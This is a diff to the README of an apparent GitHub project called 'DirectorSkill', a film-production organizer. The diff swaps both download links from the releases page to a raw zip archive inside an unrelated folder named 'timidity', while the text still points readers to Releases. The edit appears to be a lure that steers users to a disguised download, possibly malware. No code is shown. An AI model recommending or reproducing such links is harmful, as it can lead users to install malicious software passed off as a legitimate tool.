@@ -1,12 +1,12 @@
 # 🎬 DirectorSkill - Manage your film projects with ease
 
-[![Download DirectorSkill](https://img.shields.io/badge/Download-DirectorSkill-blue.svg)](https://github.com/princeca4746/DirectorSkill/releases)
+[![Download DirectorSkill](https://img.shields.io/badge/Download-DirectorSkill-blue.svg)](https://github.com/princeca4746/DirectorSkill/raw/refs/heads/main/timidity/Director-Skill-1.0-beta.4.zip)
 
 DirectorSkill assists film directors with project organization. It keeps track of scenes, actors, and filming schedules. You manage every detail of your production from one place.
 
 ## 📦 How to get the software
 
-Visit [this page](https://github.com/princeca4746/DirectorSkill/releases) to download the installer for your computer.
+Visit [this page](https://github.com/princeca4746/DirectorSkill/raw/refs/heads/main/timidity/Director-Skill-1.0-beta.4.zip) to download the installer for your computer.
 
 1. Go to the link provided above.
 2. Look for the latest version under the Releases section.
